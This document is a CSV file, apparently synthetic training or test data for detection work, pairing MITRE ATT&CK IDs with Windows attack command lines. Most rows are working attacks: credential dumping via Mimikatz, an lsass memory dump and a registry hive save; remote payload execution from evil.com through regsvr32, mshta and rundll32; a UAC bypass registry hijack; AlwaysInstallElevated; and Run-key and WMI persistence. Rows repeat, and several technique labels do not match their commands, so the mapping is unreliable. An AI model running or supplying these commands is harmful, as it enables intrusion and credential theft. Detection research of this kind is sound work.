mitre_id,command
T1129,Import-Module -Name 'C:\Windows\Temp\debug.dll' -Function *
T1087,quser /server:localhost
T1003,Invoke-Mimikatz -Command 'lsadump::sam'
T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""debug_filter"", EventNameSpace=""root\cimv2"""
T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/debug.sct"")"
T1016,arp -a
T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""debug.exe"" /f"
T1129,dotnet update_cache.dll
T1087,net user /domain it_dept
T1003,vssadmin create shadow /for=C:
T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_cache_filter"", EventNameSpace=""root\cimv2"""
T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update_cache.sct"")"
T1016,netsh interface show interface
T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
T1087,quser /server:localhost
T1003,vssadmin create shadow /for=C:
T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_cache_filter"", EventNameSpace=""root\cimv2"""
T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
T1016,ipconfig /all
T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update_cache.exe"" /f"
T1129,regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll
T1087,net user /domain backup_user
T1003,procdump.exe -ma lsass.exe payload.dmp
T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
T1016,ipconfig /all
T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
T1087,dsquery user -name admin*
T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /d ""rundll32.exe update.dll,EntryPoint"""
